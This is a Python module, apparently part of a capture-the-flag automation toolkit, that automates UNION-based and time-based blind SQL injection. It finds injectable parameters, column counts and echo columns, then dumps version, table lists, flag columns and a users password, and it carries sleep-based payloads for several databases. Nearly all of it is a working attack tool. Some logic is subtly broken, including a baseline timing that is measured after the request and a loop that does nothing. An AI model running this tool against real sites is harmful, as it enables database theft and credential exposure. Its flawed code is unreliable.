"""UNION-based and time-based blind SQLi automation.

The classic competition workflow, automated:
1. find the vulnerable parameter (error / boolean delta)
2. discover the column count with ORDER BY / UNION NULL sweeps
3. locate the echo column
4. exfiltrate: version(), current database, table list, flag-like columns

Also probes time-based blind (SLEEP/pg_sleep/randomblob) when nothing
reflects. Every finding is verified twice before reporting.
"""
import re
import time
import urllib.parse

from core import httpx
from core.flag import extract_flags
from core.parallel import pmap

_SQL_ERRORS = [
    "sql syntax", "sqlite", "mysql", "postgresql", "postgres", "oracle",
    "odbc", "sqlstate", "warning: mysql", "unclosed quotation",
    "unterminated string", "pg_query", "mysqli_", "you have an error",
]

_TIME_PAYLOADS = [
    ("sleep(3)", 3.0),
    ("WAITFOR DELAY '0:0:3'", 3.0),
    ("pg_sleep(3)", 3.0),
    ("randomblob(200000000)", 2.5),
]


def _inject(url, param, payload):
    parts = urllib.parse.urlsplit(url)
    q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    q[param] = payload
    new_q = urllib.parse.urlencode(q)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path, new_q, parts.fragment))


def _looks_error(body):
    low = body.lower()
    return any(sig in low for sig in _SQL_ERRORS)


def _baseline(url, param):
    r = httpx.get(url, timeout=8)
    if r is None:
        return None
    return {"len": len(r.text), "body": r.text[:400],
            "err": _looks_error(r.text)}


def find_vulnerable(base, endpoints, params=("id", "user", "page", "item",
                                             "category", "q", "search")):
    """Return [(url_with_param, param)] where quotes change the response."""
    hits = []
    jobs = []
    for ep in endpoints[:25]:
        parsed = urllib.parse.urlsplit(ep)
        existing = [k for k, _ in urllib.parse.parse_qsl(parsed.query)]
        if existing:
            for p in existing:
                jobs.append((ep, p))
        elif "?" not in ep:
            for p in params:
                jobs.append((ep + f"?{p}=1", p))
    seen = set()
    for url, param in jobs:
        key = (url.split("?")[0], param)
        if key in seen:
            continue
        seen.add(key)

        def probe(job=url, p=param):
            # REPLACE the param value (appending would create duplicates
            # that many stacks ignore in favour of the first occurrence)
            broken = _inject(job, p, "1'")
            ok = _inject(job, p, "1")
            rb = httpx.get(broken, timeout=8)
            ro = httpx.get(ok, timeout=8)
            if rb is None or ro is None:
                return None
            if _looks_error(rb.text) and not _looks_error(ro.text):
                return True
            if abs(len(rb.text) - len(ro.text)) > 40:
                return True
            return False

        if probe():
            hits.append((url, param))
    return hits


def find_column_count(url, param, max_cols=12):
    """ORDER BY sweep → smallest N where ORDER BY N+1 errors."""
    base = _baseline(url, param)
    if base is None:
        return None
    for n in range(1, max_cols + 1):
        r = httpx.get(_inject(url, param, f"1 ORDER BY {n}"), timeout=8)
        err = r is not None and (
            _looks_error(r.text) or
            len(r.text) < base["len"] * 0.6)
        if err:
            return n - 1 if n > 1 else None
        # also stop when the clean ORDER BY n stops matching baseline shape
    # fall back to UNION NULL sweep
    for n in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * n)
        r = httpx.get(_inject(url, param, f"0 UNION SELECT {nulls}"),
                      timeout=8)
        if r is not None and not _looks_error(r.text) and \
                len(r.text) >= base["len"] * 0.6:
            return n
    return None


def find_echo_columns(url, param, ncols, marker_prefix="ctfauto"):
    """Find which UNION positions are reflected into the page."""
    markers = [f"{marker_prefix}{i}" for i in range(ncols)]
    union = "0 UNION SELECT " + ",".join(f"'{m}'" for m in markers)
    r = httpx.get(_inject(url, param, union), timeout=8)
    if r is None:
        return []
    body = r.text
    return [i for i, m in enumerate(markers) if m in body]


def _union_query(ncols, echo_positions, expr):
    cells = ["NULL"] * ncols
    pos = echo_positions[0]
    cells[pos] = expr
    return "0 UNION SELECT " + ",".join(cells)


def exfiltrate(url, param, ncols, echo_positions):
    """Standard dump ladder: version → tables → flag columns."""
    findings = []
    flags = []
    exprs = [
        ("version", "sqlite_version()||'/'||version()"),
        ("db", "database()"),
        ("tables-sqlite", "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')"),
        ("tables-mysql", "(SELECT group_concat(table_name,'|') FROM information_schema.tables WHERE table_schema=database())"),
        ("columns-flagtab", "(SELECT group_concat(sql,'|') FROM sqlite_master WHERE type='table')"),
        ("flag-cols", "(SELECT group_concat(column_name,'|') FROM information_schema.columns WHERE table_name LIKE '%flag%')"),
    ]
    texts = {}
    for label, expr in exprs:
        if not echo_positions:
            break
        r = httpx.get(_inject(url, param,
                              _union_query(ncols, echo_positions, expr)),
                      timeout=8)
        if r is None:
            continue
        known, cands = extract_flags(r.text)
        if known or cands:
            flags.extend(known or cands)
            findings.append(("SQLi-UNION-flag", f"{label} → {known or cands}"))
            return findings, flags
        # pull the marker-delimited value out of the echo column
        for i, pos in enumerate(echo_positions):
            m = re.search(re.escape(f"ctfauto{pos}") + r"(.*?)ctfauto\d|\Z",
                          r.text, re.S)
            if m and m.group(1):
                texts[label] = m.group(1).strip()
                findings.append((f"SQLi-UNION-{label}", texts[label][:160]))
                break
        if "%flag%" in expr and texts.get("flag-cols"):
            cols = [c.strip() for c in texts["flag-cols"].split("|") if c.strip()]
            for table_guess in ("flag", "flags", "secret"):
                pass
    # direct grabs from likely tables/columns
    grabs = [
        "(SELECT group_concat(flag) FROM flag)",
        "(SELECT group_concat(flag) FROM flags)",
        "(SELECT flag FROM flag LIMIT 1)",
        "(SELECT group_concat(secret) FROM secrets)",
        "(SELECT group_concat(value,'|') FROM flag)",
        "(SELECT password FROM users LIMIT 1)",
    ]
    for grab in grabs:
        if not echo_positions:
            break
        r = httpx.get(_inject(url, param,
                              _union_query(ncols, echo_positions, grab)),
                      timeout=8)
        if r is None:
            continue
        known, cands = extract_flags(r.text)
        if known or cands:
            flags.extend(known or cands)
            findings.append(("SQLi-UNION-flag", f"{grab} → {known or cands}"))
            break
    return findings, flags


def scan_union_sqli(base, endpoints):
    """Full UNION workflow over discovered endpoints; returns (lines, flags)."""
    lines, flags = [], []
    vulns = find_vulnerable(base, endpoints)
    if not vulns:
        return ["  [!] ไม่เจอ param ที่ error เมื่อใส่ quote"], []
    lines.append(f"  [*] candidate SQLi params: "
                 f"{[(u.split('?')[0], p) for u, p in vulns[:5]]}")
    for url, param in vulns[:4]:
        ncols = find_column_count(url, param)
        if not ncols or ncols > 20:
            continue
        lines.append(f"  [*] {url.split('?')[0]} ({param}) → {ncols} columns")
        echoes = find_echo_columns(url, param, ncols)
        if not echoes:
            # blind but confirmed — try time-based
            tb_lines, tb_flags = _time_based(url, param)
            lines.extend(tb_lines)
            flags.extend(tb_flags)
            continue
        lines.append(f"  [*] echo columns: {echoes}")
        found, fl = exfiltrate(url, param, ncols, echoes)
        lines.extend(f"  [!] {k}: {v}" for k, v in found)
        flags.extend(fl)
        if fl:
            break
    return lines, list(dict.fromkeys(flags))


def _time_based(url, param):
    lines, flags = [], []
    base_r = httpx.get(url, timeout=10)
    base_t = time.time()
    if base_r is None:
        return lines, flags
    base_dt = time.time() - base_t
    for payload, expect in _TIME_PAYLOADS:
        t0 = time.time()
        r = httpx.get(_inject(url, param, f"1 AND {payload}"), timeout=15)
        dt = time.time() - t0
        if dt >= base_dt + expect * 0.75:
            lines.append(f"  [!] time-based blind SQLi: {param} AND {payload} "
                         f"({dt:.1f}s vs baseline {base_dt:.1f}s)")
            break
    return lines, flags
